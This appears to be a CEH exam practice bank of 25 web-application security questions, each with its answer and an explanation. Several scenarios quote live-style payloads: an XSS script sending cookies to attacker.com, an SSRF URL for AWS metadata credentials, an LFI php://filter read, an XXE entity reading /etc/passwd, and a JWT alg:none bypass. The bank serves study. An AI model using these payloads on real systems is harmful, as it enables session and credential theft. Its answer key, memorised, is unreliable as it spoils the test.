# 🎯 Module 14: Hacking Web Applications - Exam Scenario Practice Engine

> [!ABSTRACT] 📊 **Interactive Module Scorecard**
>
> - **Target Module**: Module 14: Hacking Web Applications
> - **Total Questions**: 25 Ultra-Detailed, 100% Unique Indirect Scenarios
> - **Exam Difficulty Standard**: Senior CEH v13 (Scenario-Driven Logic & Technical Deduction)
> - **Passing Threshold**: 85% Accuracy (22/25 Correct)
> 
> *Instructions: Evaluate the scenario context below. Select your choice, then expand the **Show Correct Answer & Exam Breakdown** callout to verify your answer and review the deep technical analysis and distractor refutations.*

---

### 🧩 Question 01 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> An attacker enters `<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>` into a public profile bio field. Whenever any user views this profile, their session cookie is stolen.
>
> What vulnerability was exploited?

#### 🔘 Available Options:

- **A**: Stored (Persistent) Cross-Site Scripting (XSS)
- **B**: Reflected Cross-Site Scripting (XSS)
- **C**: DOM-based Cross-Site Scripting (XSS)
- **D**: Cross-Site Request Forgery (CSRF)

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Stored XSS occurs when malicious scripts are saved permanently in a application backend storage (e.g., database) and executed whenever victims load the page.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Reflected XSS requires the payload to be delivered via a single request link.
> - **Option C is incorrect** because DOM XSS executes strictly within client-side DOM processing.
> - **Option D is incorrect** because CSRF forces unauthorized state-changing HTTP requests.

---

### 🧩 Question 02 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> An attacker hosts a web page containing a hidden HTML form that automatically submits a POST request (`http://bank.com/transfer?account=attacker&amount=5000`) when a victim visits the site while logged into their bank account.
>
> What vulnerability is exploited?

#### 🔘 Available Options:

- **A**: Cross-Site Request Forgery (CSRF)
- **B**: Insecure Direct Object Reference (IDOR)
- **C**: Server-Side Request Forgery (SSRF)
- **D**: SQL Injection

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> CSRF forces a logged-in victim's browser to send unauthorized HTTP requests containing their ambient credentials (cookies) to a vulnerable web application.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because IDOR accesses unauthorized records by manipulating parameters.
> - **Option C is incorrect** because SSRF forces the server to initiate outbound HTTP requests.
> - **Option D is incorrect** because SQLi manipulates database queries.

---

### 🧩 Question 03 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> A web application allows users to fetch remote images using a URL parameter (`http://example.com/load.php?url=http://image.com/pic.jpg`). An attacker changes the URL parameter to `url=http://169.254.169.254/latest/meta-data/` and receives AWS IAM security credentials.
>
> What attack was executed?

#### 🔘 Available Options:

- **A**: Server-Side Request Forgery (SSRF)
- **B**: Cross-Site Scripting (XSS)
- **C**: Local File Inclusion (LFI)
- **D**: Command Injection

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> SSRF occurs when a web server fetches remote resources specified by user input without validating destination IP addresses, exposing internal services or cloud metadata endpoints.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because XSS executes scripts in client browsers.
> - **Option C is incorrect** because LFI accesses files on the local filesystem.
> - **Option D is incorrect** because Command Injection executes OS shell commands.

---

### 🧩 Question 04 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> A user changes their account URL parameter from `http://app.com/profile?user_id=105` to `http://app.com/profile?user_id=106` and gains full access to another user's private medical records without authentication checks.
>
> What vulnerability is present?

#### 🔘 Available Options:

- **A**: Insecure Direct Object Reference (IDOR) / Broken Access Control
- **B**: Cross-Site Scripting (XSS)
- **C**: SQL Injection
- **D**: Session Fixation

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> IDOR occurs when an application exposes a reference to an internal implementation object (like a database key) without verifying user authorization.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because XSS executes scripts.
> - **Option C is incorrect** because SQLi tampers with database queries.
> - **Option D is incorrect** because Session Fixation forces a known session ID.

---

### 🧩 Question 05 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> An attacker uses a PHP stream wrapper (`http://target.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php`) to read the base64-encoded source code of a database configuration file.
>
> What vulnerability is exploited?

#### 🔘 Available Options:

- **A**: Local File Inclusion (LFI) via PHP Wrappers
- **B**: Remote File Inclusion (RFI)
- **C**: Server-Side Request Forgery (SSRF)
- **D**: Command Injection

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> LFI vulnerabilities allow attackers to use PHP filter stream wrappers (`php://filter`) to read protected application source code files.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because RFI includes external remote files over HTTP.
> - **Option C is incorrect** because SSRF forces outbound server requests.
> - **Option D is incorrect** because Command Injection executes OS commands.

---

### 🧩 Question 06 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What client-side security header instructs web browsers to restrict the sources from which scripts, stylesheets, and images can be loaded and executed?

#### 🔘 Available Options:

- **A**: Content-Security-Policy (CSP)
- **B**: X-Frame-Options
- **C**: Strict-Transport-Security
- **D**: Access-Control-Allow-Origin

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Content Security Policy (CSP) is an HTTP header that allows site operators to restrict the resources (such as JavaScript, CSS, Images) that the browser is allowed to load.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because X-Frame-Options prevents clickjacking.
> - **Option C is incorrect** because HSTS enforces HTTPS connections.
> - **Option D is incorrect** because CORS headers configure cross-origin resource sharing.

---

### 🧩 Question 07 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> An attacker modifies a JSON Web Token (JWT) header by changing `"alg": "HS256"` to `"alg": "none"`, strips the signature, and submits the modified token to gain unauthorized admin access.
>
> What flaw enabled this bypass?

#### 🔘 Available Options:

- **A**: JWT `alg: none` Signature Verification Bypass
- **B**: CSRF
- **C**: Cross-Site Scripting
- **D**: SQL Injection

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Many vulnerable JWT libraries accept the `"alg": "none"` algorithm in the JWT header, accepting unsigned tokens without verifying signatures.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because CSRF forces unauthorized requests.
> - **Option C is incorrect** because XSS executes scripts in browsers.
> - **Option D is incorrect** because SQLi manipulates SQL statements.

---

### 🧩 Question 08 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What defensive mechanism requires generating a unique, cryptographically random token for each user session and validating it on every state-changing POST request to prevent CSRF attacks?

#### 🔘 Available Options:

- **A**: Synchronizer Token Pattern (Anti-CSRF Tokens)
- **B**: Basic Authentication
- **C**: HTTP Compression
- **D**: Input Sanitization

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> The Synchronizer Token Pattern protects against CSRF by embedding an unguessable token in forms that must match the user's server-side session state.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Basic Auth transmits static credentials.
> - **Option C is incorrect** because HTTP compression reduces bandwidth.
> - **Option D is incorrect** because input sanitization prevents injection, not CSRF.

---

### 🧩 Question 09 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What type of XSS vulnerability occurs when client-side JavaScript reads data from an un-sanitized source (e.g., `document.location.hash`) and writes it directly to an execution sink (e.g., `document.write()` or `innerHTML`) without involving server-side rendering?

#### 🔘 Available Options:

- **A**: DOM-based XSS
- **B**: Reflected XSS
- **C**: Stored XSS
- **D**: Blind XSS

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> DOM-based XSS occurs entirely within the client-side browser DOM when executable sinks consume untrusted DOM sources.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Reflected XSS reflects payloads from the HTTP server response.
> - **Option C is incorrect** because Stored XSS persists in a backend database.
> - **Option D is incorrect** because Blind XSS executes in admin backends out of view.

---

### 🧩 Question 10 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What command-line tool uses community-driven YAML templates to perform fast, targeted vulnerability scans against web applications and infrastructure?

#### 🔘 Available Options:

- **A**: Nuclei
- **B**: Wireshark
- **C**: John the Ripper
- **D**: Ettercap

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Nuclei is a popular fast vulnerability scanner that uses template files written in YAML to detect security flaws.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Wireshark is a packet analyzer.
> - **Option C is incorrect** because John the Ripper is a password cracker.
> - **Option D is incorrect** because Ettercap is an ARP poisoning tool.

---

### 🧩 Question 11 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What parameter in `php.ini` MUST be enabled (`On`) for Remote File Inclusion (RFI) vulnerabilities to be successfully exploited on PHP-based web applications?

#### 🔘 Available Options:

- **A**: allow_url_include
- **B**: allow_url_fopen
- **C**: display_errors
- **D**: expose_php

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> `allow_url_include = On` permits PHP file inclusion functions (`include`, `require`) to execute code from external HTTP/FTP URLs.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because `allow_url_fopen` allows opening remote file pointers (reading only).
> - **Option C is incorrect** because `display_errors` shows PHP runtime errors.
> - **Option D is incorrect** because `expose_php` broadcasts PHP version headers.

---

### 🧩 Question 12 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What high-speed web directory and parameter fuzzing command-line tool written in Go allows penetration testers to perform rapid URL discovery using wordlists (`ffuf -u http://target/FUZZ -w wordlist.txt`)?

#### 🔘 Available Options:

- **A**: Ffuf
- **B**: Nikto
- **C**: SQLmap
- **D**: Nmap

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Ffuf (Fuzz Faster Fool) is a high-speed web fuzzer designed for directory, parameter, and header discovery.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Nikto is a vulnerability scanner.
> - **Option C is incorrect** because SQLmap automates SQL injection testing.
> - **Option D is incorrect** because Nmap is a port scanner.

---

### 🧩 Question 13 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What security principle dictates that developers should convert untrusted input into a safe form where the browser interprets HTML tags as text data rather than executable code?

#### 🔘 Available Options:

- **A**: Context-Aware Output Encoding / Entity Encoding
- **B**: Data Encryption at Rest
- **C**: Password Hashing
- **D**: Session Timeout

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Output Encoding converts characters like `<` and `>` into HTML entities (`&lt;` and `&gt;`), forcing browsers to render them safely as text.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Data Encryption protects stored files.
> - **Option C is incorrect** because Password Hashing protects credentials.
> - **Option D is incorrect** because Session Timeout terminates idle sessions.

---

### 🧩 Question 14 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> An attacker uses a web API vulnerability to send multiple nested queries to a GraphQL endpoint, exhausting server memory and causing a Denial of Service.
>
> What GraphQL vulnerability is described?

#### 🔘 Available Options:

- **A**: GraphQL Batching / Nested Query Denial of Service
- **B**: SQL Injection
- **C**: CSRF
- **D**: LFI

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> GraphQL's flexible query syntax allows attackers to construct deeply nested or batched queries that consume massive server CPU/memory resources.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because SQLi targets database engines.
> - **Option C is incorrect** because CSRF forces unauthorized state changes.
> - **Option D is incorrect** because LFI includes local files.

---

### 🧩 Question 15 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> Which tool allows security researchers to inspect, send, and automate API calls using REST, SOAP, or GraphQL specifications?

#### 🔘 Available Options:

- **A**: Postman
- **B**: Hashcat
- **C**: Wireshark
- **D**: Aircrack-ng

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Postman is an API platform used for building, testing, and debugging web APIs.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Hashcat is a password cracker.
> - **Option C is incorrect** because Wireshark sniffs raw packets.
> - **Option D is incorrect** because Aircrack-ng audits Wi-Fi security.

---

### 🧩 Question 16 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What vulnerability allows an attacker to inject shell commands directly into an application parameter executed via system calls (e.g., `system("ping " + user_input)`)?

#### 🔘 Available Options:

- **A**: OS Command Injection
- **B**: Reflected XSS
- **C**: CSRF
- **D**: Insecure Deserialization

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> OS Command Injection occurs when an application passes unsanitized user input directly to a system shell execution function.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Reflected XSS executes scripts in browsers.
> - **Option C is incorrect** because CSRF forces unauthorized HTTP requests.
> - **Option D is incorrect** because Insecure Deserialization executes untrusted objects.

---

### 🧩 Question 17 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What vulnerability standard describes applications that automatically deserialize untrusted binary or JSON object streams, allowing attackers to achieve Remote Code Execution?

#### 🔘 Available Options:

- **A**: Insecure Deserialization (OWASP A08)
- **B**: Path Traversal
- **C**: SQL Injection
- **D**: Broken Link Hijacking

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Insecure Deserialization occurs when an application processes untrusted serialized object data, enabling RCE or gadget chain execution.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Path Traversal accesses local files.
> - **Option C is incorrect** because SQL Injection manipulates SQL queries.
> - **Option D is incorrect** because Broken Link Hijacking claims expired domain references.

---

### 🧩 Question 18 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What OWASP classification encompasses security flaws resulting from unpatched third-party open-source libraries, frameworks, or dependencies (e.g., Log4j)?

#### 🔘 Available Options:

- **A**: A06: Vulnerable and Outdated Components
- **B**: A01: Broken Access Control
- **C**: A03: Injection
- **D**: A10: Server-Side Request Forgery

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> OWASP A06 covers risks associated with using outdated, unpatched, or vulnerable software components and dependencies.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because A01 covers Access Control flaws.
> - **Option C is incorrect** because A03 covers Injection flaws.
> - **Option D is incorrect** because A10 covers SSRF flaws.

---

### 🧩 Question 19 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What OWASP Software Composition Analysis (SCA) tool detects publicly disclosed vulnerabilities (CVEs) in project dependencies during software build pipelines?

#### 🔘 Available Options:

- **A**: OWASP Dependency-Check
- **B**: Burp Suite Intruder
- **C**: Wireshark
- **D**: Nmap

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> OWASP Dependency-Check scans project dependencies to identify known vulnerable third-party libraries.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Burp Intruder performs HTTP fuzzing.
> - **Option C is incorrect** because Wireshark sniffs network traffic.
> - **Option D is incorrect** because Nmap scans network ports.

---

### 🧩 Question 20 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> An attacker intercepts a password reset link (`http://app.com/reset?token=12345`) and notices that tokens are sequential numbers (12345, 12346, 12347).
>
> What vulnerability is present?

#### 🔘 Available Options:

- **A**: Predictable Password Reset Token / Broken Authentication
- **B**: Cross-Site Scripting
- **C**: SQL Injection
- **D**: CSRF

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Password reset tokens must be cryptographically random and high-entropy; sequential tokens are trivial to brute-force and guess.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because XSS executes scripts in browsers.
> - **Option C is incorrect** because SQLi alters SQL queries.
> - **Option D is incorrect** because CSRF forces unauthorized user actions.

---

### 🧩 Question 21 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What cross-origin mechanism uses HTTP response headers (`Access-Control-Allow-Origin: *`) to control which external domains are permitted to read web application responses?

#### 🔘 Available Options:

- **A**: Cross-Origin Resource Sharing (CORS)
- **B**: Content Security Policy (CSP)
- **C**: HSTS
- **D**: SameSite Cookies

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> CORS defines HTTP headers that allow servers to specify which origin domains can access their resources.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because CSP restricts resource loading origins.
> - **Option C is incorrect** because HSTS enforces HTTPS.
> - **Option D is incorrect** because SameSite controls cookie cross-domain sending.

---

### 🧩 Question 22 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What vulnerability allows an attacker to manipulate an XML input document to include external entity references (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) that read sensitive system files?

#### 🔘 Available Options:

- **A**: XML External Entity (XXE) Injection
- **B**: Reflected XSS
- **C**: CSRF
- **D**: SQL Injection

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> XXE Injection targets misconfigured XML parsers evaluating external entity references, leading to file disclosure or SSRF.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because Reflected XSS executes scripts in browsers.
> - **Option C is incorrect** because CSRF forces unauthorized POST requests.
> - **Option D is incorrect** because SQLi manipulates database queries.

---

### 🧩 Question 23 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> An attacker uses a web proxy to intercept a request and changes a hidden form field `<input type="hidden" name="role" value="user">` to `value="admin"`.
>
> What attack vector is this?

#### 🔘 Available Options:

- **A**: Parameter Tampering / Hidden Field Manipulation
- **B**: SQL Injection
- **C**: Cross-Site Scripting
- **D**: SSRF

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Parameter Tampering includes modifying hidden form fields to alter application behavior or privileges.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because SQLi targets database statements.
> - **Option C is incorrect** because XSS executes scripts in browsers.
> - **Option D is incorrect** because SSRF forces server HTTP requests.

---

### 🧩 Question 24 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What is the primary defensive mitigation against XML External Entity (XXE) Injection attacks in web application XML parsers?

#### 🔘 Available Options:

- **A**: Disabling External Entity Resolution (`DOCTYPE` and DTD processing) in the XML parser
- **B**: Enabling HTTP Compression
- **C**: Using SSL/TLS Certificates
- **D**: Disabling JavaScript

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Disabling DTD execution and external entity resolution in XML parsers completely prevents XXE attacks.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because HTTP compression reduces bandwidth.
> - **Option C is incorrect** because SSL encrypts transport layer packets.
> - **Option D is incorrect** because disabling JS affects client scripts, not XML.

---

### 🧩 Question 25 | Scenario Challenge

> [!QUESTION] 📌 **Scenario Context**
> What is the primary operational objective of conducting web application penetration testing?

#### 🔘 Available Options:

- **A**: To identify, analyze, and remediate application-layer security vulnerabilities before malicious actors exploit them
- **B**: To increase server RAM capacity
- **C**: To format database hard drives
- **D**: To bypass physical door locks

> [!SUCCESS]- 🔑 **Show Correct Answer & Exam Breakdown**
> **Correct Answer**: **Option A**
>
> #### 💡 Technical Deep Dive:
> Web application penetration testing aims to proactively find and patch security flaws in business logic and code.
>
> #### 🚫 Distractor Analysis & Refutations:
>
> - **Option B is incorrect** because pen testing does not add hardware RAM.
> - **Option C is incorrect** because formatting drives is destructive malware behavior.
> - **Option D is incorrect** because door locks pertain to physical security.
